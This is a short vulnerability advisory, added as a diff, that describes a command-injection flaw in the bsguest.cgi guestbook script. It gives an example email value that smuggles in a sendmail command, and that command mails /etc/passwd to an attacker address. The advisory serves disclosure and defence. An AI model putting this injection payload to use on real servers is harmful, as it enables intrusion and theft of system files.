@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/2159/info
+
+An input validation vulnerability exists in Brian Stanback's bsguest.cgi, a script designed to coordinate guestbook submissions from website visitors.
+
+The script fails to properly filter ';' characters from the user-supplied email address collected by the script.
+
+As a result, maliciously-formed values for this field can cause the the script to run arbitrary shell commands with the privilege level of the web server.
+
+
+Attacker enters his email address as <whitehatjoe@hotmail.com>
+
+'hacker@example.com;/usr/sbin/sendmail hacker@example.com < /etc/passwd',
+
+server mails a confirmation letter along with the passwd file to the attacker.
